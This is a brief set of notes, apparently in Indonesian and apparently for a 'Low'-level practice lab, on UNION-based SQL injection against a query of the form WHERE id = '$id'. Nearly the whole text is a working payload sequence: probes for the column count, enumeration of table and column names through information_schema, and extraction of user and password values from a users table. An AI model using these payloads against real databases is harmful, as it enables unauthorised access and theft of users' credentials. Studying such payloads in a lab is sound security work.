-- Low Sql Inject

Where ID =  '$id'

2'

select * from nama_table where id = '2' order by 1 -- -'

2' union select 1,2 -- -'

2' union select 'kolom 1','kolom 2' -- -'

2' union select 1,2 from user(), database() -- -'
nama table dan nama kolom

2' union select 1,concat(table_name,'::', column_name) from information_schema.columns where table_schema = database() -- -'

table user
kolom user, pw

2' union select 1, concat(user, '::', password) from users -- -'







